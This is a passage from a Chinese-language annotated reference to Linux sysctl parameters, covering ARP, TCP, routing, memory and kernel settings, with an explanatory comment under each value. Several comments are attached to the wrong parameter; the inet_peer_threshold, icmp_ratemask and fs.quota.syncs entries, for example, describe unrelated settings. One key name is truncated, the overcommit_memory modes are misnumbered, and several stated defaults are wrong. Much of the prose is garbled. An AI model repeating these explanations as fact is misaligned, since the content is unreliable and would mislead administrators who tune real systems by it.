0\n#是否进行多播路由。只有内核编译有config_mroute并且有路由服务程式在运行该参数才有效。\n\nnet.ipv4.neigh.default.gc_thresh3 = 1024\n#保存在ARP高速缓存中的最多纪录的硬限制,一旦高速缓存中的数目高于此垃圾收集器将马上进行。缺省值为1024\n\nnet.ipv4.neigh.default.gc_thresh2 = 512\n#保存在ARP高速缓存中的最多记录软限制,垃圾收集器在开始收集前,允许记录数超过这个数字5秒。缺省值5121\n\nnet.ipv4.neigh.default.gc_thresh1 = 128\n#存在于ARP高速缓存中的最少层数。如果少于这个数,垃圾收集器将不会运行,缺省值是128。\n\nnet.ipv4.neigh.default.gc_interval = 30\n#收集相邻层记录的无用记录的垃圾收集程序的运行周期,缺省值30秒。\n\nnet.ipv4.neigh.default.locktime = 99 net.ipv4.neigh.eth0.locktime = 99\nnet.ipv4.neigh.lo.locktime = 99\n#ARP记录保存在高速缓存内的最短实际那(jiffy数),以防止存在多个可能映射(potential mapping)时,ARP高速缓存系统的颠簸(经常是由于网络的错误配置而引起)。缺省值是1秒。\n\nnet.ipv4.neigh.default.proxy_delay = 79 net.ipv4.neigh.eth0.proxy_delay = 79\nnet.ipv4.neigh.lo.proxy_delay = 79\n#当接收到有一个请求已知的代理ARP地址的ARP请求时,在回应前可以延迟的jiffy(时间单位)数目。这样以防止网络风暴。缺省值(0.8秒)\n\nnet.ipv4.neigh.default.anycast_delay = 99 net.ipv4.neigh.eth0.anycast_delay = 99\nnet.ipv4.neigh.lo.anycast_delay = 99\n#对IPV4相邻信息的回复的最大延迟时间。目前还不支持anycast。缺省值为99秒。\n\nnet.ipv4.neigh.default.proxy_qlen = 64 net.ipv4.neigh.eth0.proxy_qlen = 64\nnet.ipv4.neigh.lo.proxy_qlen = 64\n#能放入代理ARP地址队列(proxy-ARP addresses)的数据包最大数目。缺省值64。\n\nnet.ipv4.neigh.default.unres_qlen = 3 net.ipv4.neigh.eth0.unres_qlen = 3\nnet.ipv4.neigh.lo.unres_qlen = 3\n#每个没有被其它网络层解析的地址,在队列中可存放包的最大数目。缺省值3。\n\nnet.ipv4.neigh.default.gc_stale_time = 60 net.ipv4.neigh.eth0.gc_stale_time = 60\nnet.ipv4.neigh.lo.gc_stale_time = 60\n#决定检查一次相邻记录的有效性的周期。当相邻层记录失效时,将在给它发送数据前。再解析一次。缺省值是60秒。\n\nnet.ipv4.neigh.default.delay_first_probe_time = 5 \nnet.ipv4.neigh.eth0.delay_first_probe_time =5 net.ipv4.neigh.lo.delay_first_probe_time = 5\n#发现某个相邻记录无效(stable)后,发出第一个探测要等待的时间,缺省为5秒。\n\nnet.ipv4.neigh.default.base_reachable_time = 30 net.ipv4.neigh.eth0.base_reachable_time = 30\nnet.ipv4.neigh.lo.base_reachable_time = 30\n#一旦发现相邻记录,至少在一段介于base_reachable_time/2和3*base_reacheable_time/2之间的随机时间内,该记录是有效的。如果收到上层协议的肯定反馈,那么记录的有效期将延长。缺省值30秒。\n\nnet.ipv4.neigh.default.retrans_time = 99 net.ipv4.neigh.eth0.retrans_time = 99\nnet.ipv4.neigh.lo.retrans_time = 99\n#重发一个请求前的等待jiffy(时间单位)的数目。缺省值是1秒。\n\nnet.ipv4.neigh.default.app_solicit = 0 net.ipv4.neigh.eth0.app_solicit = 0\nnet.ipv4.neigh.lo.app_solicit = 0\n#这是在使用多路广播探测(multicast probe)前,经过网络连接送到用户间隙ARP端口监控程序的探测(probe)最大数目。缺省值0。\n\nnet.ipv4.neigh.default.ucast_solicit = 3 net.ipv4.neigh.eth0.ucast_solicit = 3\nnet.ipv4.neigh.lo.ucast_solicit = 3\n#询问ARP端口监控程序前,试图发送单探测(unicast probe)的次数。缺省值是3秒\n\nnet.ipv4.neigh.default.mcast_solicit = 3 net.ipv4.neigh.eth0.mcast_solicit = 3\nnet.ipv4.neigh.lo.mcast_solicit = 3\n#在把记录标记为不可抵达之前。用多路广播/广播(multicast/broadcast)方式解析地址的最大次数。\n\nnet.ipv4.tcp_bic = 1\n#默认值为0,为快速长距离网络启用binary increase congestion,这样可以更好的利用以GB速度进行操作的链接。\n\nnet.ipv4.tcp_westwood = 0\n#默认值为0,启用发送者端的拥塞控制算法,它可以维护对吞吐量的评估,并试图对带宽的整体利用情况进行优化。对于WAN通讯来说应该启用这个选项。\n\nnet.ipv4.tcp_no_metrics_save = 0\n#不缓存ssthresh链接。默认关闭。\n\nnet.ipv4.ipfrag_secret_interval = 600\nnet.ipv4.tcp_low_latency = 0\n#默认值是0,允许TCP/IP栈适应在高吞吐量情况下低延时的情况,这个选项一般是禁用的。\n\nnet.ipv4.tcp_tw_reuse = 1\n#默认值是0,该文件表示师傅允许重新应用处于TIME-WAIT状态的socket用于新的TCP连接(这个对快速重启动某些服务,而启动后提示端口已经被使用的情形非常有帮助)\n\nnet.ipv4.icmp_ratemask = 6168 net.ipv4.icmp_ratelimit = 1000\n#某些路由器违背RFC1122标准。其对广播帧发送伪造的响应来应答。这种违背行为通常会被以警告的方式记录在系统日志中。如果该选项设置为true,内核不会记录这种警告信息。\n\nnet.ipv4.tcp_adv_win_scale = 2\n#默认值为2,计算缓冲开销bytes/2^tcp_adv_win_scale(如果tcp_adv_win_scale >0)或者bytes-bytes/2^(-tcp_adv_win_scale)(如果tcp_adv_win_scale BOOLEAN默认值为0)\n\nnet.ipv4.tcp_app_win = 31\n#默认值为31,保留max(window/2^tcp_app_win,mss)数量的窗口由于应用缓冲。当为0时表示不需要缓冲。\n\nnet.ipv4.tcp_rmem = 4096 87380 174760\n#这选项有三个NETEGER变量:min,default,max。\n#min:为TCP socket预留用于接收缓冲的内存数量,即时内存出现紧张情况下TCP socket都至少会有这么多数量的内存用于接收缓冲。默认值为8K。\n#Default:为TCP socket预留用于接收缓冲的内存数量,默认情况下该值影响其他协议使用的net.core.wmem_default值。该值决定了在tcp_adv_win_scale、tcp_app_win和tcp_app_win=0默认情况下,TCP窗口大小为65535,默认值为87380。\n#Max:用于TCP socket接收缓冲的内存最大值。该值不会影响net.core.wmem_max,“静态”选择参数SO_SNDBUF则不受该值影响,默认值为128K。默认值为87380*2bytes.一般来说max的值为default的两倍。\n\nnet.ipv4.tcp_wmem = 4096 16384 131072\n#这个选项有三个INTEGER变量:min,default,max\n# Min:为TCP socket预留用于发送缓冲内存最小值。每个tcp socket都可以在建议以后都可以使用它。默认值为4096(4K)\n# Default:为TCP_default值,一般低于net.core_wmem_default的值。默认值为16384(16K)。\n#Max:用于TCP socket发送缓冲的内存最大值。该值不会影响net.core.wmem_max,“静态”选参数SO_SNDBUF则不受该值影响。默认值为131072(128K)。这个数值对发送数据很有帮助。\n\nnet.ipv4.tcp_mem = 786432 1048576 1572864\n#此选项里有三个变量:low,pressure,high。\n#Low:当TCP使用了低于该值的内存页面数时,TCP不会考虑释放内存。(理想情况下,这个值应与指定给tcp_wmem的第2个值相匹配-这第2个值表明,最大页面大小乘以最大并发请求数除以页大小(131072*300/4096)。)\n#Pressure:当TCP使用了超过该值的内存页面数量时,TCP试图稳定其内存使用,进入pressure模式,当内存消耗低于low值时则退出pressure状态。(理想情况下这个值应该是TCP可以使用的总缓冲区大小的最大值(204800*300/4096))\n#High:允许所有tcp sockets用于排队缓冲数据报的页面量。(如果超过这个值,TCP链接将被拒绝,这就是为什么不要令其过于保守(512000*300/4096)的原因了,在这种情况下,提供的价值很大,它能处理很多连接,是所预期的2.5倍;或者使现有连接能够传输2.5倍的数据。)\n\nnet.ipv4.tcp_dsack = 1\n#默认值为1,允许TCP发送“两个完全相同”的SACK。\n\nnet.ipv4.tcp_ecn = 0\n#默认值为0,打开TCP的直接拥塞通告功能。\n\nnet.ipv4.tcp_reordering = 3\n#默认值为3,TCP流中重排序的数据报最大数量,(一般推荐要比3大一些,比如说5)\n\nnet.ipv4.tcp_fack = 1\n#默认值为1,打开FACK拥塞避免和快速重传功能。(当tcp_sack设置为0的时候,这个值即使设置为1也无效。)\n\nnet.ipv4.tcp_orphan_retries = 0\n#默认值是7,在近端丢弃TCP链接前,要进行多少次重试,默认值为7个,相当于50秒-16分钟,视RTO而定。如果您的系统是负载很大的web服务器,那么也许需要降低该值,这类sockets可能会耗费大量的资源。\n\nnet.ipv4.inet_peer_gc_maxtime = 120\n#废物收集(GC)通过最大间隔,这个间隔会影响到缓冲池中内存的低压力。该值以jiffies为单位测量。\n\nnet.ipv4.inet_peer_gc_mintime = 10\n#每一遍碎片收集之间的最小时间间隔,当内存压力比较大的时候,调整这个间隔非常有效。\n\nnet.ipv4.inet_peer_maxttl = 600\n#entries的最大生存期。在pool没有内存压力的情况下(比如,pool中entries的数量非常少的时候,)未使用的entries经过一段时间就会过期。\n\nnet.ipv4.inet_peer_minttl = 120\n#entries的最小生存期,应该不晓旭汇聚断分片的生存期。当pool的大小不大于Inet_peer_threshold时,这个最小生存期必须予以确保,以jiffies计\n\nnet.ipv4.inet_peer_threshold = 65664\n#这个文件里面写着一个数字,表示主机是否通过RARP、BOOTP、DHCP或其他机制取得其IP设置,否则就是0\n\nnet.ipv4.igmp_max_msf = 10\nnet.ipv4.igmp_max_memberships = 20\n#主机上最多有多少个igmp(多播)套接字进行监听。\n\nnet.ipv4.route.secret_interval = 600\nnet.ipv4.route.min_adv_mss = 256\n#该文件表示最小的MSS(Maximum Segrnent Size)大小,取决于第一跳的路由器MTU.缺省值:256\n\nnet.ipv4.route.min_pmtu = 552\n#该文件表示最小路径MTU的大小\n\nnet.ipv4.route.mtu_expires = 600\n#该文件表示PMTU信息缓存多长时间(秒)缺省设置:600秒\n\nnet.ipv4.route.gc_elasticity = 8 net.ipv4.route.gc_min_interval = 0\nnet.ipv4.route.gc_thresh = 524288\n#用管理控制路由收集算法的频度和行为。用来设置失败恢复时非常重要。一旦上一次路由失败经过这么多秒后,linux会跳过失败而转向其他路由。如果你想要更快速的失败恢复就可以降低这个值。\n\nnet.ipv4.route.error_burst = 5000\n#这些参数用来限制从路由代码写入内核日志的warning消息。Error_cost这个值越高,写的消息越少。Error_burst控制什么时候应该丢弃消息。缺省值设置是限制为每5秒钟一次。\n\nnet.ipv4.route.error_cost = 1000\n#这些参数用来限制从路由代码写入内核日志的warning消息。Error_cost的值越高,写的消息越少,error_burst控制什么时候应该丢弃消息,缺省设置是限制为每5秒一次。\n\nnet.ipv4.route.redirect_silence = 20480\n#重定向的超时,经过这么长时间后,重定向会重发,而不管是否已经因为超过load或者number限制而停止。\n\nnet.ipv4.route.redirect_number = 9\n#决定是否要向特定主机发送更多的ICMP重定向的因子。一旦达到load限制或者number的限制就不再发送。\n\nnet.ipv4.route.redirect_load = 20\n#决定是否要向特定主机发送更多的ICMP重定向的因子。一旦达到load限制或者number限制后就不在发送。\n\nnet.ipv4.route.gc_interval = 60\n#默认值为60,数值越小cache释放的速度会越快。意思是说:cache会记录连线当时的资讯,如gateway如果断线的当时,cache记录的gateway依然是断掉连线的那一条线路的gateway。而且cache的reflush时间又还那么长,就会产生连线失效的状况,因此把数值调低看看。\n\nnet.ipv4.route.gc_timeout = 300\n#刷新路由缓冲的延时。\n\nnet.ipv4.route.max_size = 8388608\n#路由缓冲的最大值。一旦缓冲满。就清除旧的条目。\n\nnet.ipv4.route.max_delay = 10\n#刷新路由缓冲的最大延迟。\n\nnet.ipv4.route.min_delay = 2\n#刷新路由缓冲的最小延迟。\n\nnet.ipv4.icmp_errors_use_inbound_ifaddr = 0\n#允许使用接收到造成这一错误的报文的接口地址。\n\nnet.ipv4.icmp_ignore_bogus_error_responses = 0\n#默认是0,设置他之后,能忽略由网络中的那些声称回应地址是广播地址的主机生产的ICMP错误。\n\nnet.ipv4.icmp_echo_ignore_broadcasts = 0\n#默认设置为1忽略子网广播消息。可以拒绝服务攻击\n\nnet.ipv4.icmp_echo_ignore_all = 0\n#根本不要响应echo包。不要设置为默认,他可能在你正被利用成为DoS攻击的跳板时可能有用。\n\nnet.ipv4.ip_local_port_range = 32768 61000\n#用于向外连接的宽口范围。默认情况为1024到61000\n\nnet.ipv4.tcp_max_syn_backlog = 1024\n#记录的那些尚未收到客户端确认信息的链接请求的最大值。 默认值为4096 如果设置这个值大于4096最好同时调整include/net/tcp.h中的TCP_SYNQ_HSIZE,保证TCP_SYNQ_HSIZE*16 <=tcp_max_syn_backlo然后重新编译内核。\n\nnet.ipv4.tcp_rfc1337 = 0\n#这个开关能启动对于在RFC1337中描述的“tcp的time-wait”问题的修复。启用后,内核将丢弃那些发往time-wait状态TCP套接字的RST包,默认是0.\n\nnet.ipv4.tcp_stdurg = 0\n#使用TCP紧急指针的主机需求解释。因为大多数主机采用BSD解释。所以如果你在linux上打开它,可能会影响它与其它机器的正常通讯。默认是0\n\nnet.ipv4.tcp_abort_on_overflow = 0\n#控制着当有很多的链接请求时内核的行为。启用的话,如果服务超载,内核将主动发送RST包。\n\nnet.ipv4.tcp_tw_recycle = 1\n#能够更快的回收TIME-WAIT。默认值为1。\n\nnet.ipv4.tcp_syncookies = 0\n#默认值是0,只有在内核编译时选择了CONFIG_SYNCOOKIES时才会发生作用。当出现syn等候队列出现溢出时对方发送syncookies。目的是为了防止syn flood攻击。\n\nnet.ipv4.tcp_fin_timeout = 60\n#当套接字由本端要求关闭,它决定保持在FIN-WAIT-2状态的时间。默认值为60秒。2.2内核的通常值是180秒。这个数值如果设置太大会出现内存溢出的风险。\n\nnet.ipv4.tcp_retries2 = 15\n#在杀掉一个活动的TCP链接前重试多少次。RFC 1122规定这个限制应该长于100秒。默认值是15相当于13~30分钟(取决于RIO)\n\nnet.ipv4.tcp_retries1 = 3\n#在认定出错并向网络层提交错误报告前,重试多少次。默认设置为RFC规定的最小值:3,相当于3秒~8分钟(取决于RIO)\n\nnet.ipv4.tcp_keepalive_intvl = 75\n#当检测没有确认时,重新发送检测的频度,默认是75秒。\n\nnet.ipv4.tcp_keepalive_probes = 9\n#在认定链接失效之前,发送多少个TCP的keepalive的检测包,默认值为9.这个值乘以tcp_keepalive_intvl之后决定了一个链接发送了keepalive之后可以有多少时间没有回应。\n\nnet.ipv4.tcp_keepalive_time = 7200\n#当启用keepalive的时候,TCP发送keepalive消息的频度,默认为2小时。\n\nnet.ipv4.ipfrag_time = 30\n#IP分片在内存中的保留时间(秒数)\n\nnet.ipv4.ip_dynaddr = 0\n#该参数通常用于拨号连接的情况,可以使用系统能够立即改变IP包的源地址为该IP地址,同时中断原有的tcp对话而用新地址重新发出一个syn请求包,开始新的tcp对话。在默认ip欺骗时,该参数可以立即改变伪装地址为新的IP地址。该参数的参数值可以是:\n#1. 启动该功能。\n#2. 使用冗余模式启动该功能。\n#0. 禁止该功能。\n\nnet.ipv4.ipfrag_low_thresh = 196608\n#用于IP分片汇聚的最小内存用量。\n\nnet.ipv4.ipfrag_high_thresh = 262144\n#用于IP分片汇聚的最大内存用量。\n\nnet.ipv4.tcp_max_tw_buckets = 180000\n#系统同时保持timewait套接字的最大数。默认值为180000。\n\nnet.ipv4.tcp_max_orphans = 262144\n#系统中最多有多少个TCP套接字不被关联到任何一个用户文件句柄上。如果超过这个数字,孤儿链接将即将被复位并打印出警告信息。这个限制仅仅是为了防止简单的DOS攻击。\n\nnet.ipv4.tcp_synack_retries = 5\n#为了打开对端的链接,内核需要发送一个SYN并附带一个回应前面一个SYN的ACK。也就是所谓三次握手中的第二次握手。这个设置决定了内核放弃链接前发送SYN+ACK包的数量。\n\nnet.ipv4.tcp_syn_retries = 5\n#在内核放弃建立连接前发送SYN包的数量。\n\nnet.ipv4.ip_nonlocal_bind = 0\n#如果你希望你的应用程序能够绑定到不属于本地网卡的地址上时,设置这个选项。如果你的机器没有专线时非常有用,即使你的链接断开,你的服务也可以启动并绑定在一个指定的地址上。\n\nnet.ipv4.ip_no_pmtu_disc = 0\n#如果你想禁止“沿途MTU发现”就设置它。“沿途MTU发现”是一种技术,可以在传输路径上检测出最大的MTU值。\n\nnet.ipv4.ip_autoconfig = 0\n#这个文件里面写着一个数字,表示主机是否通过RARP、BOOTP、DHCP或者其他机制取得其IP配置,否则就是0.\n\nnet.ipv4.ip_default_ttl = 64\n#数据包的生存期。\n\nnet.ipv4.ip_forward = 0\n#路由转发功能,默认为0是关闭的,如需要打开需要更改为1。\n\nnet.ipv4.tcp_retrans_collapse = 1\n#为兼容某些糟糕的打印机设置的“将错就错”选项。再次发送时,把数据包增大一些,来避免某些TCP协议栈的BUG。\n\nnet.ipv4.tcp_sack = 1\n#特别针对丢失的数据包使用选择性ACK,这样有助于快速恢复。\n\nnet.ipv4. = 1\n#一般来说TCP/IP允许设置窗口尺寸达到65535字节,对于速度确实很高的网络而言这个值可能还是太小。这个选项允许设置上G字节的窗口大小,在带宽延时很大的环境中使用。如果内核认为它无法发包,就会丢弃这个个包,并向发包的主机发送ICMP通知。\n\nnet.ipv4.tcp_timestamps = 1\n#时间戳可以避免序列号的卷绕。一个1Gbps的链路肯定会遇到以前用过的序列号,时间戳能够让内核接受这种“异常”的数据包。\n\nnet.core.somaxconn = 128\n#限制套接字侦听积压,已知在使用着的somaxconn。默认值为128。如果调整套接字请参阅tcp_max_syn_backlog。\n\nnet.core.divert_version = 0.46\nnet.core.optmem_max = 20480\n#指定了每个套接字说允许的最大缓冲区的大小\n\nnet.core.message_burst = 10\n#写新的警告消息所需的时间(以1/10秒为单位);在这个时间内所收到的其它警告消息会被丢弃。则用于防止某个企图用消息“淹没”您系统的人所使用的拒绝服务(denial of service)攻击。缺省设置10秒\n\nnet.core.message_cost = 5\n#该文件存有与每个警告消息相关的成本值,该值越大,越有可能忽略警告消息。默认值:5\n\nnet.core.mod_cong = 290\nnet.core.lo_cong = 100\nnet.core.no_cong = 20\nnet.core.no_cong_thresh = 10\nnet.core.netdev_max_backlog = 300\n#指定在接口接收数据包的速率比内核处理这些包的速率快时,允许送到队列的数据包的最大数。\n\nnet.core.dev_weight = 64\n#为CPU分时系统包调度工作。默认值为64\n\nnet.core.rmem_default = 135168\n#接收窗口的默认大小\n\nnet.core.wmem_default = 135168\n#默认的发送窗口大小\n\nnet.core.rmem_max = 135168\n#接收窗口的最大大小\n\nnet.core.wmem_max = 135168\n#发送窗口的最大大小\n\nvm.percpu_pagelist_fraction = 0\nvm.max_queue_depth = 0\nvm.oom-kill = 1\nvm.legacy_va_layout = 0\n#该文件表示是否使用最新的32位共享内存mmap()系统调用,linux支持的共享内存分配方式包括mmap(),posix,system VIPC。\n#0, 使用最新32为mmap()系统调用。\n#1, 使用2.4内核提供的系统调用。\n#默认值:0\n\nvm.vfs_cache_pressure = 100\n#该文件表示内核回收用于directory和inode cache内存的倾向;缺省值100表示内核将根据pagecache和swapcache,把directory和inode cache保持在一个合理的百分比;降低该值低于100,将导致内核倾向于保留directory和inode cache;增加该值超过100,将导致内核倾向于回收directory和inode cache。缺省值:100\n\nvm.block_dump = 0\n#该文件表示是否打开block Debug模式,用于记录所有的读写及Dirty Block写回动作。缺省值:0禁用Block Bebug模式。\n\nvm.laptop_mode = 0\n#如果返回值为0的话。表示系统还未进行Laptop Mode。如果返回其他正数值表示系统成功进入Laptop Mode。\n\nvm.max_map_count = 65536\n#该文件允许max_map_count限制虚拟内存的数量。\n\nvm.min_free_kbytes = 102400\n#该文件表示强制linux vm最低保留多少空闲内存(Kbytes)。\n\nvm.lower_zone_protection = 0\nvm.hugetlb_shm_group = 0\n#该文件表示允许使用hugetlb页创建system VIPC共享内存段的系统组ID。\n\nvm.nr_hugepages = 0\n#该文件表示系统保留的hugetlb页数。\n\nvm.swappiness = 60\n#减少系统对于swap频繁的写入,将加快应用程序之间的切换,有助于提升系统性能。默认值为60。\n\nvm.nr_pdflush_threads = 2\n#该文件表示当前正在运行的pdflush进程数量,在I/O负载高的情况下,内核会自动增加更多pdflush进程。 缺省设置:2(只读)\n\nvm.dirty_expire_centisecs = 3000\n#该文件表示如果废数据在内存中驻留时间超过该值,pdflush进程在下一次将把这些数据写回磁盘。\n\nvm.dirty_writeback_centisecs = 500\n#该文件表示pdflush进程周期性间隔多久把废数据写回磁盘。缺省值:500(1/100秒)\n\nvm.dirty_ratio = 40\n#该文件表示如果进程产生的废数据到达系统整体内存的百分比,此时进程自信把废数据写回磁盘。 缺省值:40。\n\nvm.dirty_background_ratio = 10\n#该文件表示废数据到达系统整体内存的百分比,此时触发pdflush进程把废数据写回磁盘。缺省设置:10\n\nvm.page-cluster = 3\n#该文件表示在写一次到swap区的时候写入的页面数量,0表示1页,1表示2页,2表示4页 缺省值为3(2的3次方,8页)\n\nvm.overcommit_ratio = 50\n#该文件表示,如果overcommit_memory=2,可以过载内存的百分比,通过以下公式来计算系统整体可用内存。 系统可分配内存=交换空间+物理内存*overcommit_ratio/100。\n\nvm.overcommit_memory = 0\n#该文件指定了内核针对内存分配的策略,其值可是0、1、2。\n#2, 表示内存将检查是否足够的可用内存供应用进程使用;如果有足够的可用内存,内存申请允许;否则,内存申请失败,并把错误返回给应用进程。\n#3, 表示内存允许分配所有的物理内存,而不管当前的内存状态如何。\n#4, 表示内核允许分配超过所有物理内存和交换空间总和的内存。(参照overcommit_ratio)。\n\nkernel.wake_balance = 1\n#导致调度运行线程被唤醒的任何avaialble调度的CPU。而不是它的CPU的优化的基础上缓存痕迹。默认为1\n\nkernel.suid_dumpable = 0\nkernel.unknown_nmi_panic = 0\n#该参数的值影响的行为(非屏蔽中断处理)。当这个值为非0,未知的NMI受阻,PANIC出现。这时,内核调试信息显示控制台,则可以减轻系统中的程序挂起。\n\nkernel.ngroups_max = 65536\n#该文件显示了最大数量的补充群体用户可以是一个成员(内核的NGROUPS_MAX)的使用者。缺省值是65536,这可调似乎没有在任何地方使用最新的内核\n\nkernel.printk_ratelimit_burst = 10\n#一段时间后,我们执行一个信息由printk_ratelimit秒钟,我们允许脉冲信息通过。Printk_ratelimit_burst指定信息数量。在ratelimiting开始起用前,我们提交出信息。\n\nkernel.printk_ratelimit = 5\n#一些警告信息速度有限。Printk_ratelimit指定的最小长度的时间间隔这些信息(秒)。默认情况下,我们允许美5秒间隔。值为0时将禁用速率限制。\n\nkernel.panic_on_oops = 1\n#控制内核的行为时遇到错误。\n#0 尝试继续运行。\n#1 延迟几秒钟(输出klogd时间记录),然后警告,如果警告sysctl也是非0后机器将重新启动。\n\nkernel.pid_max = 32768\n#PID分配限制值。当内核下一个PID值到达这个值,它会回到最低的PID值。PID的最大的pid_max未分配,默认值为32768\n\nkernel.overflowgid = 65534和kernel.overflowuid = 65534\n#这两个文件分别保存那些支持16位用户标识和组标识的任何文件系统的用户标识(UID)和组标识(GID)。可是更改这些值,但如果您确实觉得需要这样做,那么可能会发现更改组和密码文件项更容易些。\n\nkernel.pty.nr = 1\n#这个只读文件表明多少unix的98假终端目前正在使用\n\nkernel.pty.max = 4096\n#此文件规定的最大数量的unix 98 假终端。\n\nkernel.random.uuid = cbd55511-5292-4195-99f3-c7e0b5b87624\nkernel.random.boot_id = 538713fc-3f16-4d9f-9c75-7e5e61c10ee9\n#这个只读文件包含随机字符串一样。一次是在系统启动后产生。另见:与/proc/sys/kernel/random/uuid.\n#这个只读文件包含随机字符串一样。每次都会重新读。请参阅:/proc/sys/kernel/random/boot_id。\n\nkernel.random.write_wakeup_threshold = 128\n#此文件包含二进制位数以下唤醒进程,做选择()或查询()的写权限的/dev/rrandom。\n\nkernel.random.read_wakeup_threshold = 64\n#这个文件包含了很多信息片,他们有关于激活很多因等待查询/dev/random信息而休眠的进程。默认值为64。\n\nkernel.random.entropy_avail = 3456\n#这个只读文件给出可用的平均信息量,通常,这个字为4096(bits)。一个全部的信息平均量的统筹。\n\nkernel.random.poolsize = 512\n#这个文件提供平均信息数量池的大小。通常,这将是4096bits(512btyes).它可以将其更改为任何值的一种算法用。目前的选择是:32,64,128,256,512,1024,2048。\n\nkernel.threads-max = 139264\n#该文件指定内核所能使用的线程的最大数目。\n\nkernel.cad_pid = 1\n#按 ctrl-alt-del这个顺序 按下这些键  可以查到进程的id,init默认的id是1\n\nkernel.sysrq = 0\n#如果该文件指定的值为非0,则激活sysctem request key。默认值:0。\n\nkernel.sem = 250 32000 32 128\n#该参数表示设置的信号量。\n\nkernel.msgmnb = 16384\n#该文件指定在一个消息队列中最大的字节数 缺省设置:16384。\n\nkernel.msgmni = 16\n#该文件指定消息队列标识的最大数目。缺省设置:16。\n\nkernel.msgmax = 8192\n#该文件指定了从一个进程发送到另一个进程的消息最大长度。进程间的消息传递是在内核的内存中进行的。不会交换到硬盘上。所以如果增加该值,则将增加操作系统所使用的内存数量。\n\nkernel.shmmni = 4096\n#该参数用于设置系统范围内共享内存段的最大数量,默认值为4096,通常不需要修改。\n\nkernel.shmall = 2097152\n#该参数表示统一一次可以使用的共享内存总量(以页为单位)。默认是2097152,通常不需要修改。\n\nkernel.shmmax = 33554432\n#该参数定义了共享内存段的最大尺寸(以字节为单位)。默认是32M。\n\nkernel.acct = 2  4 30\n#该文件有三个配置值,根据包含日志的文件系统上可用空间的数量(以百分比表示),这些值控制何时开始进行进程记账,如果可用空间低于这个百分比值,则停止进程记账,如果可用共建高于这个百分比值,则开始进程记账。检查上面两个值得频率(以秒为单位)要更改这个文件的某个值,应该回送用空格分隔开的一串数字。默认值:2 4 30如果包含日志的文件系统上只有少于2%的可用空间,则这些值会使记账停止,如果有4%或者更多的空间,则再次启动记账,每30秒做一次检查。\n\nkernel.hotplug = /sbin/hotplug\n#hotplug的策略代理的位置,默认值是“/sbin/hotplug”\n\nkernel.modprobe = /sbin/modprobe\n#这里是modprobe所存放的位置,使用这个程序按照要求装载模块。缺省值:”/sbin/modprobe”.\n\nkernel.printk = 6 4 1 7\n#该文件有四个数字值,它们根据日志记录消息的重要性,定义将其发送到何处,关于不同日志级别的更多信息,请阅读syslog。该文件4个值为:\n#控制台日志级别,优先级高于该值的消息将打印值控制台。\n#缺省消息日志级别:将用该优先级来打印没有优先级的消息。\n#最低的控制台日志级别:控制台日志级别可被设置最小值(最高优先级)\n#缺省的控制台日志级别:控制台日志级别的缺省值、\n#缺省设置:6 4 1 7。\n\nkernel.ctrl-alt-del = 0\n#该文件有一个二进制值,该值控制系统在接收到ctrl+alt+delete按键组合时如何反应,这两个关键值为0值表示捕获ctrl+alt+delete。并将其送至init程序。这将允许系统可以完美地关闭和重启,就好象你输入shutdown命令一样。1值表示不捕获ctrl+alt+delete,将执行非干净的关闭,就好象直接关闭电源一样。默认值为0。\n\nkernel.real-root-dev = 0\n#如果你已经支持编译initrd内核这个是可以编译的。在这种情况下,如果“真”根设备可以从linux内部文件系统改变新的文件设备号\n\nkernel.cap-bound = -257\n#这个参数所谓“性能限制规定”的使用者空间:列表功能,可以将\n\nkernel.tainted = 0\n#如果内核已经被非零改变。数值可ORed在一起:\n#1 一个模块与非GPL许可已被载入,这包括模块没有授权。(把modutils和module-init-tools在一起。)\n#2 这个模块被insmod强制装入。(把modutils和module-init-tools)。\n#4 不安全的SMP处理器:CPU的SMP与SMP不适合。\n#8 一个模块被rommod强制卸载(把modutils和module-init-tools)\n#16 自动校验发生异常。\n#32 系统已达到bad_page\n\nkernel.core_pattern = core\n#是用来指定一个核心DumpFlie可格局名称:最大长度是64个字符。默认值为:“core”。Core_pattern被用作一种模式模板的输出文件名。某些字符串的模式(从“%”)是取代其实际值。反向兼容core_uses_pid:如果core_pattern不包括“%,p值”(默认是不)和core_uses_pid设置,然后\n\nkernel.core_uses_pid = 1\n#默认coredump filename是“核心”。通过设置core_uses_pid为1(默认值为0),文件名的coredump成为核心PID。如果core_pattern不包括“%p”(默认是不)和core_uses_pid设置。那时pid将附加到文件名上。\n\nkernel.print-fatal-signals = 0\n#这能够打印出一些关于用户在内核控制台出错的一些信息。它能记录早先的用户在那里出现了错误。默认是 off\n\nkernel.exec-shield-randomize = 1\n#文件控制exec-shield是否要随机化VM映射。\n#0- 禁用随机化VM映射。\n#1- 启用随机化VM映射。\n#此选项默认值为1\n\nkernel.exec-shield = 1\n#文件控制总体Exec-shield功能。这里他值有以下几个\n#0-(包括随机化的VM映射)在所有的二进制程序中被禁用,不管它是否已被标记。\n#1-在所有标记的二进制程序中被启用。\n#2-在所有二进制程序中被启用,不管它是否被标记)(仅用于测试目的)\n#此选项默认值为1.\n\nkernel.panic = 0\n#该文件表示如果发生“内核严重错误(kernel panic)”,则内核在重新引导之前等待的时间(以秒为单位)。0秒设置在内发生内核严重错误时将禁止重新引导。缺省值:0\n\nkernel.domainname = (none)\n#该文件允许配置网络域名。它没有缺省值,也许已经设置了域名。也许没有设置。\n\nkernel.hostname = localhost.localdomain\n#该文件允许你配置网络主机名。\n\nkernel.version = #1 SMP Fri Apr 20 16:36:54 EDT 2007\n#内核版本\n\nkernel.osrelease = 2.6.9-55.ELsmp\n#内核OS 发布号\n\nkernel.ostype = Linux\n#内核OS类型。\n\nfs.mqueue.msgsize_max = 8192\n#此文件可以用来查看和更改信息最大值的限度。这个值作为上限的属性。Attr->mq_msgsize争论惯于mq_open(3).默认值为8192字节;上限是INT_MAX(2147483647的linux/86)。此限制被忽略的特殊程序(CAP_SYS_RESOURCE).\n\nfs.mqueue.msg_max = 10\n#此文件可以用来查看和更改值上限的最大数量的信息在一个队列中。这个值起到了一个最高限度的作用。这个值默认最小值为10;上限是硬盘最大值(131072/sizeof(void *))(32768上Linux/86).这个限制忽视了特殊程序。但是尽管如此HARD_MAX实行最高限额。\n\nfs.mqueue.queues_max = 256\n#此文件可以用来查看和更改系统数量限制和消息队列,这个是可以创建。一旦达到限额。只有特殊的进程可以创建新的消息队列。这个默认值为256.它可以将其更改范围为0-INT_MAX的值\n\nfs.quota.syncs = 21\n#加大SYN队列长度可以容纳更多等待连接的网络连接数。\n\nfs.aio-max-nr = 65536 fs.aio-nr = 